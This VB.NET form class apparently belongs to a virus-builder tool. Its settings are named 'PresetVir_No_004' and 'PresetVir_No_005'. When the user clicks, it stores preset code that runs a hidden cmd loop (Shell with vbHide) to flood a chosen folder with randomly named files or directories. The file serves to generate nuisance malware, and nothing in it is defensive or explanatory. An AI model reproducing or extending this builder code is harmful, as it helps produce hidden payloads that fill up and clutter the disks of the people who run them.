Public Class Options_04
    Public Response As String

    Private Sub LogInButtonWithProgress2_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress2.Click
        Dim cond1t As String = "1, 1, " & LogInNumeric1.Value
        If LogInNumeric1.Value = "0" Then
            cond1t = " 0, 0, 0 "
        End If

        If LogInLabel1.Text = "Fichiers" Then
            My.Settings.PresetVir_No_004 = "'=== Create Files ===
         Randomize()
Shell (" & Chr(34) & "cmd /c for /l %x in (" & cond1t & ") do echo " & LogInNormalTextBox1.Text & "\%random% > %x%random%" & Chr(34) & "& Int(Rnd() * 10000) &" & Chr(34) & "." & LogInNormalTextBox2.Text & Chr(34) & ", vbHide)"
        Else

            My.Settings.PresetVir_No_005 = "'=== Create Directory ===
Shell (" & Chr(34) & "cmd /c for /l %x in (" & cond1t & ") do md " & LogInNormalTextBox1.Text & "\%random%%x.%random%" & Chr(34) & ", vbHide)"
        End If

        Me.Close()

    End Sub

    Private Sub LogInButtonWithProgress33_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress33.Click

        Dim dlg As New FolderBrowserDialog()

        If dlg.ShowDialog() = DialogResult.OK Then
            Dim path As String = dlg.SelectedPath
            LogInNormalTextBox1.Text = path

        End If


    End Sub



End Class